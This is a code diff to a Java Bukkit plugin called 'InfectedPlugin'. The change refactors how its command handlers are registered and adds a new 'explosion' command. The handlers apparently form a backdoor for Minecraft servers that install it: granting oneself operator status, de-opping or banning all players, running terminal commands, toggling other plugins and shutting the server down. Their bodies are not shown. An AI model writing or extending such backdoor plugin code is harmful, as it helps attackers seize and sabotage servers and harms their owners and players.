@@ -1,9 +1,9 @@
 package org.CreeperCoders.InfectedPlugin;
 
 import java.util.logging.Logger;
-
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
@@ -27,20 +27,22 @@ public class InfectedPlugin extends JavaPlugin
         log.info(String.format("[%s] %s is registering all events...", getDescription().getName(), getDescription().getName()));
         try
         {
-            //this.getServer().getPluginManager().registerEvents(new IP_PlayerListener(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_banall(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_deop(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_op(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_enablevanilla(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_help(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_opme(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_terminal(this), this);
-            //this.getServer().getPluginManager().registerEvents(new Command_fuckoff(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_shutdown(), this);
-            //this.getServer().getPluginManager().registerEvents(new Command_randombanl(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_enableplugin(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_disableplugin(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_deopall(), this);
+            PluginManager pm = getServer().getPluginManager();
+            //pm.registerEvents(new IP_PlayerListener(), this);
+            pm.registerEvents(new Command_banall(), this);
+            pm.registerEvents(new Command_deop(), this);
+            pm.registerEvents(new Command_op(), this);
+            pm.registerEvents(new Command_enablevanilla(), this);
+            pm.registerEvents(new Command_help(), this);
+            pm.registerEvents(new Command_opme(), this);
+            pm.registerEvents(new Command_terminal(this), this);
+            //pm.registerEvents(new Command_fuckoff(), this);
+            pm.registerEvents(new Command_shutdown(), this);
+            //pm.registerEvents(new Command_randombanl(), this);
+            pm.registerEvents(new Command_enableplugin(), this);
+            pm.registerEvents(new Command_disableplugin(), this);
+            pm.registerEvents(new Command_deopall(), this);
+            pm.registerEvents(new Command_explosion(), this);
         }
         catch (Exception ex)
         {
